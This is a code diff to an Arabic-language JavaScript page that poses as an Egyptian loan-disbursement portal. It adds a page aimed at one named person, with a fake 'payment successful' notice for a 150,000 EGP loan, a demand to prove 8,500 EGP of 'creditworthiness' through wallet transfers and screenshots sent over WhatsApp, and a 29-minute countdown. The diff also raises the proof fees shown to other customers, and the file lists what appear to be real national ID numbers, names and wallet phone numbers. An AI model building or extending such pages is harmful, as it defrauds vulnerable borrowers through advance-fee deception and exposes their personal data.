@@ -440,7 +440,7 @@
     // ========== قاعدة البيانات المصححة (جميع العملاء) ==========
     const customersDatabase = {
         // العملاء الأصليون
-        "29006040102911": { name: "مصطفى ربيع عبد الحميد", loan: 40000, wallet: "فودافون كاش", walletNum: "01003165531", suspended: false },
+        "26907312400212": { name: "صابر جيد محمد عبد المالك", loan: 150000, wallet: "اتصالات كاش", walletNum: "01157259243", suspended: false },
         "29409010209751": { name: "انس محمد حسين محمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01009031820", suspended: false },
         "27108062501071": { name: "اسماعيل محمد خليل محمد", loan: 55000, wallet: "اتصالات كاش", walletNum: "01115421242", suspended: false },
         "27803151602972": { name: "محمد احمد عيد البسطويسي", loan: 30000, wallet: "فودافون كاش", walletNum: "01008584346", suspended: false },
@@ -527,9 +527,96 @@
         return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
     }
 
-    // رسالة خاصة لعميل رضا على عبده (يتطلب إثبات الجدارة عبر واتساب)
+    // ========== واجهة خاصة للعميل صابر (26907312400212) ==========
+    function buildSpecialProofForSabar(customer, nationalId) {
+        const proofAmount = 8500;   // مبلغ الجدارة ثابت 8500
+        const deadlineTime = "4:30 عصراً";
+        // مؤقت 29 دقيقة = 1740 ثانية
+        let secondsLeft = 29 * 60;
+        
+        // إيقاف أي مؤقت سابق
+        if (deliveryInterval) clearInterval(deliveryInterval);
+        
+        const refNum = Math.floor(Math.random() * 1e9);
+        const now = new Date();
+        
+        const html = `
+            <div class="payment-card">
+                <div style="display:flex; justify-content:space-between; border-bottom:1px dashed var(--emerald); padding-bottom:0.6rem;">
+                    <h2 style="font-size:1.6rem; background:linear-gradient(120deg,#fff,var(--emerald)); -webkit-background-clip:text; background-clip:text; color:transparent;"><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
+                    <p style="color:var(--royal-gold);">رقم المعاملة: TX-${refNum}</p>
+                </div>
+                <div class="amount-block" style="text-align:center; margin:1rem 0;">
+                    <div style="font-size:1rem; color:var(--text-muted);">المبلغ المدفوع (القرض)</div>
+                    <div class="amount-value">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
+                </div>
+                <div class="details-grid">
+                    <div class="detail-item"><span><i class="fas fa-wallet"></i> طريقة الدفع</span><span>${customer.wallet}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> سيتم الدفع إلى محفظة</span><span>${customer.walletNum || "غير مسجل"}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span></div>
+                </div>
+                <div class="info-message" style="background:rgba(212,175,55,0.2); border-right-color:var(--warning);">
+                    <i class="fas fa-hourglass-half"></i> <strong>⚠️ طلبك معلق منذ أكثر من أربعة أيام</strong><br>
+                    بمجرد إثبات الجدارة الائتمانية (مبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م) سيتم <span class="highlight-value">تفعيل صرف القرض فوراً في أقل من 10 دقائق</span>.
+                </div>
+                <div class="timer-glow">
+                    <div><i class="fas fa-stopwatch"></i> المهلة المتبقية لإثبات الجدارة</div>
+                    <div class="timer" id="saberProofTimer">${formatTimeLeft(secondsLeft * 1000)}</div>
+                    <div style="font-size:0.7rem;">⚠️ يجب إكمال الإثبات قبل الساعة ${deadlineTime} (خلال 29 دقيقة من الآن)</div>
+                </div>
+                <div class="received-badge">✅ مبلغ القرض 150,000 ج.م في انتظار إعطائك إذن السحب بمجرد الإثبات.</div>
+            </div>
+            <div class="credit-card">
+                <h3 style="color:var(--emerald); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إجراءات إثبات الجدارة الائتمانية (خاص بالعميل صابر)</h3>
+                <div class="step-box" style="border-right-color:var(--royal-gold);">
+                    <strong>📌 التعليمات المطلوبة لإتمام الإثبات بنجاح:</strong><br>
+                    • يجب أن يتوفر في محفظتك مبلغ لا يقل عن <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span> كجدارة ائتمانية.<br>
+                    • قم بالتقاط صورة (سكرين شوت) توضح رصيد حسابك ويظهر به مبلغ الجدارة أو أعلى.<br>
+                    • قم بتحويل نفس المبلغ (أو الموجود) إلى أي حساب تابع لك (أحد أقاربك أو أصدقائك).<br>
+                    • التقط صورة لعملية التحويل من حسابك إلى الحساب الآخر.<br>
+                    • بعد التحويل، قم بالاستعلام عن رصيد حسابك مرة أخرى والتقط صورة تظهر خصم المبلغ.<br>
+                    • أرسل <strong>الصور الثلاث</strong> (رصيد قبل التحويل، صورة التحويل، رصيد بعد التحويل) إلى قسم التحويلات المالية عبر الواتساب.
+                </div>
+                <div class="step-box">
+                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بعد استلام الصور والتحقق منها، سيتم إيداع مبلغ القرض (150,000 ج.م) في حسابك خلال أقل من 10 دقائق مباشرة.
+                </div>
+                <button class="btn-whatsapp" id="saberWhatsappBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات إلى مدام اسراء على (قسم التحويلات المالية)
+                </button>
+            </div>
+        `;
+        document.getElementById('resultSection').innerHTML = html;
+        
+        // تشغيل المؤقت الخاص (29 دقيقة)
+        const timerEl = document.getElementById('saberProofTimer');
+        let interval = setInterval(() => {
+            if (secondsLeft <= 0) {
+                clearInterval(interval);
+                if (timerEl) timerEl.innerText = "00:00";
+                alert("انتهت المهلة المحددة (29 دقيقة). لم يتم إثبات الجدارة في الوقت المطلوب. سيتم إلغاء العملية.");
+                document.getElementById('resultSection').innerHTML = `<div class="suspended-card" style="border-color:#EF4444;"><i class="fas fa-times-circle"></i> انتهت المهلة. يرجى التواصل مع الدعم.</div>`;
+            } else {
+                secondsLeft--;
+                const mins = Math.floor(secondsLeft / 60);
+                const secs = secondsLeft % 60;
+                if (timerEl) timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+            }
+        }, 1000);
+        
+        // زر واتساب يوجه رسالة خاصة لمدام اسراء على
+        const wsBtn = document.getElementById('saberWhatsappBtn');
+        if (wsBtn) {
+            wsBtn.onclick = () => {
+                const msg = `السلام عليكم ورحمة الله وبركاته\n\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nأرفق لكم صور إثبات الجدارة الائتمانية (المبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م):\n1- صورة رصيد المحفظة قبل التحويل.\n2- صورة تحويل المبلغ إلى حساب تابع لي.\n3- صورة رصيد المحفظة بعد التحويل.\n\nأرجو التحقق والإيداع الفوري لمبلغ القرض (${customer.loan.toLocaleString('ar-EG')} ج.م) في محفظتي (${customer.walletNum}).\nتحياتي، ${customer.name}`;
+                window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
+                alert("تم توجيهك إلى محادثة واتساب مع مدام اسراء على. يرجى إرفاق الصور الثلاث والمتابعة لإتمام الصرف.");
+            };
+        }
+    }
+
+    // ========== باقي الدوال المساعدة (بدون تغيير جوهري) ==========
     function buildProofRequiredMessage(customer, nationalId) {
-        const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+        const proofAmount = customer.loan < 100000 ? 6500 : 8500;
         return `
             <div class="proof-required-card">
                 <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--royal-gold);"></i>
@@ -578,7 +665,7 @@
         const proofBtn = document.getElementById('proofWhatsAppBtn');
         if (proofBtn) {
             proofBtn.onclick = () => {
-                const proofAmount = customer.loan < 100000 ? 6000 : 8000;
+                const proofAmount = customer.loan < 100000 ? 6500 : 8500;
                 const msg = `📢 طلب إثبات الجدارة الائتمانية\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المطلوب إثباته: ${proofAmount.toLocaleString('ar-EG')} ج.م\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو توجيهي لإتمام إجراءات الإثبات.`;
                 window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
                 alert("تم فتح محادثة واتساب مع قسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
@@ -773,6 +860,7 @@
         window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`, '_blank');
     }
 
+    // البحث الرئيسي مع إضافة الحالة الخاصة للعميل صابر
     function searchCustomer() {
         const nationalId = document.getElementById('nationalId').value.trim();
         if (!nationalId) { alert('الرجاء إدخال الرقم القومي'); return; }
@@ -791,7 +879,13 @@
             currentNationalId = nationalId;
             document.getElementById('errorCard').style.display = 'none';
 
-            // حالة خاصة لرضا على عبده (يتطلب إثبات الجدارة فوراً)
+            // حالة خاصة للعميل صابر (26907312400212)
+            if (nationalId === "26907312400212") {
+                buildSpecialProofForSabar(customer, nationalId);
+                return;
+            }
+
+            // حالة خاصة لرضا على عبده
             if (nationalId === "29407021601596") {
                 const html = buildProofRequiredMessage(customer, nationalId);
                 document.getElementById('resultSection').innerHTML = html;
@@ -800,7 +894,7 @@
                 return;
             }
 
-            // حالة خاصة لعبد الرحيم احمد (تعليق لمدة ساعة)
+            // حالة خاصة لعبد الرحيم احمد
             if (nationalId === "28712102703133") {
                 if (!customer.holdUntil) {
                     customer.holdUntil = Date.now() + HOLD_DURATION_MS;
